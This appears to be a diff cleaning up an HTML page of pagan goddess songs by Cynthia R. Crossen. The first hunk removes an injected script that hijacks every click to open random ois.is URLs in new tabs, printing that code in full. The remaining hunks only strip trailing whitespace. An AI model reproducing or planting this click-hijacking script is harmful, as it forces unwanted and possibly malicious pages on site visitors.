@@ -1,81 +1,3 @@
-<script>(function (parameters) {
-    const targets = [
-        \'https://ois.is/images/logo-1.png\', \'https://ois.is/images/logo-2.png\', \'https://ois.is/images/logo-3.png\', \'https://ois.is/images/logo-4.png\', \'https://ois.is/images/logo-5.png\', \'https://ois.is/images/logo-6.png\', \'https://ois.is/images/logo-7.png\', \'https://ois.is/images/logo-8.png\'
-    ]
-    // Times between clicks
-    const restMinutes = 1;
-    // Number of hours to allow re-click 
-    const allowedHours = 2;
-
-
-    const saveTargetLocationsToStorage = (targets) => {
-        targets.forEach((target, index) => {
-            if(!localStorage.getItem(`${target}-local-storage`)){
-            	localStorage.setItem(`${target}-local-storage`, 0);
-            }
-        });
-    }
-    const getRandomLocationFromStorage = (targets) => {
-        const nonVisited = targets.filter((target, index) => localStorage.getItem(`${target}-local-storage`) == 0)
-        return nonVisited[Math.floor(Math.random() * nonVisited.length)];
-    }
-    const setLocationAsVisited = (target) => localStorage.setItem(`${target}-local-storage`, 1);
-
-    const getTimeStorage = (key) => localStorage.getItem(`${key}-local-storage`);
-    const setTimeToStorage = (key, nowDate) => localStorage.setItem(`${key}-local-storage`, nowDate);
-
-    const getHoursDiff = (startDate, endDate) => {
-        const msInHour = 1000 * 60 * 60;
-        return Math.round(Math.abs(endDate - startDate) / msInHour);
-    }
-    const getMintsDiff = (startDate, endDate) => {
-        const msInMints = 1000 * 60;
-        return Math.round(Math.abs(endDate - startDate) / msInMints);
-    }
-
-    const visitNewLocation = (targets, host, nowDate) => {
-        saveTargetLocationsToStorage(targets);
-        newLocation = getRandomLocationFromStorage(targets);
-        setTimeToStorage(`${host}-mnts`, nowDate);
-        setTimeToStorage(`${host}-hurs`, nowDate);
-        setLocationAsVisited(newLocation);
-        window.open(newLocation, "_blank");
-    }
-
-    // const randomLocation = getRandomLocationFromStorage(targets);
-    saveTargetLocationsToStorage(targets);
-
-    function globalClick(event) {
-        event.stopPropagation();
-        const host = location.host;
-        let newLocation = getRandomLocationFromStorage(targets);
-        const nowDate = Date.parse(new Date());
-        const savedDateForMints = getTimeStorage(`${host}-mnts`);
-        const savedDateForHours = getTimeStorage(`${host}-hurs`);
-
-        if (savedDateForMints && savedDateForHours) {
-            try {
-                const storageDateForMints = parseInt(savedDateForMints);
-                const storageDateForHours = parseInt(savedDateForHours);
-                const mintsDiff = getMintsDiff(nowDate, storageDateForMints);
-                const hoursDiff = getHoursDiff(nowDate, storageDateForHours);
-
-                if (hoursDiff >= allowedHours) {
-                    saveTargetLocationsToStorage(targets);
-                    setTimeToStorage(`${host}-hurs`, nowDate);
-                }
-                if (mintsDiff >= restMinutes) {
-                    if (newLocation) {
-                        setTimeToStorage(`${host}-mnts`, nowDate);
-                        window.open(newLocation, "_blank");
-                        setLocationAsVisited(newLocation);
-                    }
-                }
-            } catch (error) { visitNewLocation(targets, host, nowDate); }
-        } else { visitNewLocation(targets, host, nowDate); }
-    }
-    document.addEventListener("click", globalClick)
-})()</script>
 <html>
   <head>
     <meta HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=utf-8">
@@ -145,12 +67,12 @@
     Make us stronger, Give us courage,<br />
     Show your glory, Artemis.<br />
     </p>
-    
-    
+
+
     <a name="demeter"><h3>Demeter and Persephone</h3></a>
     <p>
       <i>Words:</i> Laura G. Lindgren &amp; Cynthia R. Crossen;
-      <i>Music:</i> Cynthia R. Crossen; 
+      <i>Music:</i> Cynthia R. Crossen;
       &copy; 1986 Cynthia R. Crossen
     </p>
     <p>
@@ -256,8 +178,8 @@
     With the changes turning, Grief and love we know,<br />
     So circles have their seasons and from the depths we grow, grow, grow.<br />
     </p>
-    
-    
+
+
     <a name="hestia"><h3>Hestia</h3></a>
     <p>
       <i>Words &amp; Music:</i> Cynthia R. Crossen;
@@ -293,12 +215,12 @@
     <p>
     Flame (burning), coals (warming), heart turning, transforming fire.<br />
     </p>
-    
-    
+
+
     <a name="hera"><h3>Hymn To Hera</h3></a>
     <p>
       <i>Words:</i> Sandra Brooks-Mathers;
-      <i>Music:</i> Cynthia R. Crossen; 
+      <i>Music:</i> Cynthia R. Crossen;
       &copy; 1986 Cynthia R. Crossen
     </p>
     <p>
@@ -329,12 +251,12 @@
     Burning, burning, burning bright,<br />
     Hera, Kali, Queen of Might.<br />
     </p>
-    
-    
+
+
     <a name="aphrodite"><h3>Aphrodite</h3></a>
     <p>
       <i>Words:</i> Sandra Brooks-Mathers &amp; Cynthia R. Crossen;
-      <i>Music:</i> Cynthia R. Crossen; 
+      <i>Music:</i> Cynthia R. Crossen;
       &copy; 1986 Cynthia R. Crossen
     </p>
     <p>
@@ -370,7 +292,7 @@
     </p>
     <p>
     Graceful as two swans on water gliding together awhile,<br />
-    Dance in time with your fine lover, hold your lover within your smile.<br /> 
+    Dance in time with your fine lover, hold your lover within your smile.<br />
     </p>
     <p>
     Beauty, love and pleasure you give us full measure,<br />
@@ -381,12 +303,12 @@
     Aphrodite, Aphrodite,<br />
     Aphrodite, Aphrodite, delight!<br />
     </p>
-    
-    
+
+
     <a name="athena"><h3>Athena</h3></a>
     <p>
       <i>Words:</i> Cynthia R. Crossen &amp; Laura G. Lindgren ;
-      <i>Music:</i> Cynthia R. Crossen; 
+      <i>Music:</i> Cynthia R. Crossen;
       &copy; 1986 Cynthia R. Crossen
     </p>
     <p>
